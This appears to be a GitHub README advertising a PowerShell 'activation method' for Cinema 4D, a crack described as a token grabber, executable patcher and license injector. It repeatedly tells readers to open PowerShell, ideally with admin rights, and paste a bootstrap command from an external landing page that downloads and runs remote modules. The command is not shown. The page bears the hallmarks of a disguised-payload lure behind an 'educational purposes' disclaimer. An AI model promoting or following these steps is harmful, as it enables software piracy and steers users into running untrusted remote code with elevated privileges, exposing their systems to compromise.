<div align="center">
<img src="assets/banner.png" width="100%" alt="Cinema 4D Activation Method Via banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DB2777?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DC2626?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=0891B2&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%9A%80+C4D+Powershell+Activation+Pro;%E2%AD%90+No+Limits;%F0%9F%94%A7+Full+Feature+Suite;%F0%9F%93%A6+Active+Development+2026;%E2%9C%85+Ready+for+Windows;%F0%9F%92%A1+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

Cinema 4D Activation Method via PowerShell — rebuilt for 2026 with AI-assisted token processing and real-time license state refresh. **11 modules**, grouped for quick scanning.

---

## ⚡ Core Activation Modules
- Token grabber for Cinema 4D R21–2026 installs — reads existing license state before patching
- PS-driven patcher for `.exe` signature check — tested against the current build, failures logged to console
- License blob injector that writes the activation token into the C4D config hive
- Real-time state watcher — re-applies the token if C4D resets it after a crash
- Offline activation path for air-gapped workstations (no telemetry callback)

## 🤖 AI-Assisted Processing (2026 addition)
- AI token classifier — auto-picks the correct activation payload for the C4D version it detects
- Heuristic fallback if the classifier confidence is low — refuses to touch mismatched builds
- Real-time update channel pulling hotfixed patches from the landing URL

## 🛠️ Maintenance Modules
- Cleanup routine that removes stale activation keys from previous runs
- Version fingerprint reporter — prints the exact C4D build before and after
- Dry-run mode (default `-WhatIf`-style) so you can inspect what *would* change

---

## 🖥️ PowerShell Setup (early CTA) — v2026 build

Open **Windows PowerShell** (5.1+), paste the bootstrap command, hit Enter. Full command and troubleshooting live on the landing page.

---

<p align="center">
  <a href="https://Prathameshk2.github.io/c4d-powershell-activation/">
    <img src="files/button.svg" width="520" alt="Open Powershell Setup" />
  </a>
</p>

## 📋 System Requirements
- Windows 10 or Windows 11 (x64)
- PowerShell 5.1 minimum (PowerShell 7 supported, tested)
- Network access for the real-time update channel
- Cinema 4D R21–2026 installed and previously launched once (config hive must exist)
- Admin rights recommended (needed to write the activation token into `%PROGRAMDATA%`)

## 🎬 Features
- 11 total modules — activation, AI-assisted classification, and maintenance
- Bare-PowerShell bootstrap — no installer binary, no `.exe` download
- Token detection runs *before* any write, so a mismatched C4D build is a safe no-op
- AI classifier tested against R21, R25, 2023 and 2026 builds on my own machine
- Real-time state watcher survives a C4D crash and re-applies on next launch
- Dry-run default — I made it non-destructive on the first pass so you can read the log
- Offline path for machines with no outbound network
- Cleanup routine I added after the second run left orphaned keys on my test box
- Version fingerprint printed at start and end — you'll always know what changed

## ⚙️ How it works
1. Open PowerShell → paste the bootstrap command from the landing page → Enter.
2. Bootstrap pulls the current activation module set from the landing URL.
3. Module reads the installed Cinema 4D version and fingerprint.
4. Token grabber reads existing license state into memory.
5. AI classifier (or heuristic fallback) picks the matching activation token.
6. Patcher applies the token to the C4D config hive; watcher stays resident until launch succeeds.
7. Log written to console; version fingerprint printed before exit.

No `.exe` download, no GitHub Releases CTA — setup is the landing button.

## 🧩 Compatibility
- Cinema 4D R21, R25, 2023 and 2026 (my own tested matrix)
- Windows 10 21H2+, Windows 11 22H2+
- PowerShell 5.1 (default on both) and PowerShell 7.4
- Offline mode supported with a pre-fetched module bundle
- Intel and AMD CPUs — no ARM64 testing done; treat it as unsupported for now

## ❓ FAQ
**Q: Is there an `.exe` download?**
No. Setup is PowerShell only — click the button on the landing page, paste the command, hit Enter.

**Q: Which PowerShell version do I need?**
5.1 or newer. Windows 10/11 ship with 5.1 by default; PowerShell 7 works too.

**Q: Do I need admin?**
Recommended. Token writes to `%PROGRAMDATA%\MAXON` need elevation. Non-admin mode will reduce functionality to read-only detection.

**Q: Will it break my C4D install?**
Dry-run is the default on first invocation. Nothing writes until you see the diff and re-run without `-WhatIf`-style guard. Still, back up your config hive first.

**Q: Does it work offline?**
Yes, with a pre-fetched module bundle. The real-time update channel is disabled in offline mode.

**Q: Which C4D versions are tested?**
R21, R25, 2023, 2026 — those are the builds I have real hardware for. Other builds go through the heuristic fallback and *refuse* on low confidence.

**Q: Where does the license token land?**
In the Cinema 4D config hive under `%PROGRAMDATA%\MAXON`. Cleanup module removes stale keys.

**Q: Can I undo it?**
Yes — the cleanup module removes injected tokens and restores the pre-run fingerprint, which is logged at step 3.

## ⚠️ Disclaimer
For **educational and research purposes only**. This repository documents a PowerShell-based activation method for Cinema 4D as a reverse-engineering and scripting exercise. Use at your own risk — you are responsible for compliance with MAXON's license terms and local law. The maintainers assume no liability for misuse.

## 📜 License
MIT — see `LICENSE` in the repo root.

---

## 🖥️ PowerShell Setup (final CTA) — v2026 build

Open **Windows PowerShell** → paste the command from the landing page → Enter. Update channel and troubleshooting all live there.
